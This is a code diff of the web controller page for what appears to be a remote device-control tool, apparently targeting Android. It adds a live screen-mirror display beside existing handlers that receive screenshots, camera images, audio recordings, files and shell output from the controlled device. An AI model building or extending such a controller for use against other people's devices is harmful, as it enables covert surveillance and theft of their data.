@@ -36,12 +36,15 @@
         .btn-sm { padding: 6px 12px; font-size: 12px; }
         .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; }
         .grid-3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 8px; }
-        .log { background: #0b0b12; border-radius: 12px; padding: 12px; height: 160px; overflow-y: auto; font-family: 'Fira Code', monospace; font-size: 11px; line-height: 1.6; border: 1px solid #2a2a3a; white-space: pre-wrap; word-break: break-all; }
+        .log { background: #0b0b12; border-radius: 12px; padding: 12px; height: 120px; overflow-y: auto; font-family: 'Fira Code', monospace; font-size: 11px; line-height: 1.6; border: 1px solid #2a2a3a; white-space: pre-wrap; word-break: break-all; }
         .log .time { color: #6a6a82; }
         .log .sent { color: #4caf50; }
         .log .received { color: #ffb74d; }
         .log .error { color: #e94560; }
         .log .info { color: #8a8a9e; }
+        .mirror-box { background: #0b0b12; border-radius: 12px; border: 1px solid #2a2a3a; min-height: 100px; display: flex; align-items: center; justify-content: center; overflow: hidden; }
+        .mirror-box img { max-width: 100%; max-height: 300px; object-fit: contain; }
+        .mirror-box .placeholder { color: #6a6a82; font-size: 14px; padding: 20px; text-align: center; }
         @media (max-width: 480px) { .grid-3 { grid-template-columns: 1fr 1fr; } }
     </style>
 </head>
@@ -75,6 +78,15 @@
                 <button class="btn btn-danger" onclick="disconnect()">Disconnect</button>
             </div>
             <div class="status" id="ctrlStatus">🔴 Disconnected</div>
+        </div>
+
+        <!-- Mirror Display -->
+        <div class="card">
+            <div class="card-title">🖥️ Mirror</div>
+            <div class="mirror-box" id="mirrorBox">
+                <img id="mirrorImage" style="display:none;" />
+                <span class="placeholder" id="mirrorPlaceholder">Mirror will appear here</span>
+            </div>
         </div>
 
         <div class="card">
@@ -311,11 +323,22 @@
         }
 
         // ========================================
-        // HANDLE RESPONSE (Controller)
+        // HANDLE RESPONSE (Controller) – includes mirror display
         // ========================================
         function handleResponse(data) {
             const type = data.type;
             const val = data.value;
+
+            // Mirror frames – display in the image element
+            if (type === 'mirror_frame') {
+                const img = document.getElementById('mirrorImage');
+                const placeholder = document.getElementById('mirrorPlaceholder');
+                img.src = 'data:image/png;base64,' + val;
+                img.style.display = 'block';
+                placeholder.style.display = 'none';
+                return;
+            }
+
             if (type === 'screenshot_data' || type === 'camera_data') {
                 const win = window.open('', '_blank');
                 if (win) {
@@ -324,21 +347,29 @@
                 } else {
                     log('📷 ' + (type === 'screenshot_data' ? 'Screenshot' : 'Camera') + ' received', 'received');
                 }
-            } else if (type === 'mirror_frame') {
-                log('🖥️ Mirror frame received', 'received');
-            } else if (type === 'file_data') {
+                return;
+            }
+
+            if (type === 'file_data') {
                 log('📁 File data received', 'received');
                 const a = document.createElement('a');
                 a.href = 'data:application/octet-stream;base64,' + val;
                 a.download = 'downloaded_file.bin';
                 a.click();
-            } else if (type === 'audio_data') {
+                return;
+            }
+
+            if (type === 'audio_data') {
                 log('🎤 Audio data received', 'received');
                 const a = document.createElement('a');
                 a.href = 'data:audio/3gpp;base64,' + val;
                 a.download = 'audio.3gp';
                 a.click();
-            } else if (type === 'file_list') {
+                return;
+            }
+
+            // Other responses as before
+            if (type === 'file_list') {
                 try { const arr = JSON.parse(val); log('📂 ' + arr.map(f => f.name + (f.isDir ? '/' : '')).join(', '), 'received'); } catch { log('📂 ' + val, 'received'); }
             } else if (type === 'shell_result') {
                 log('💻 ' + val, 'received');
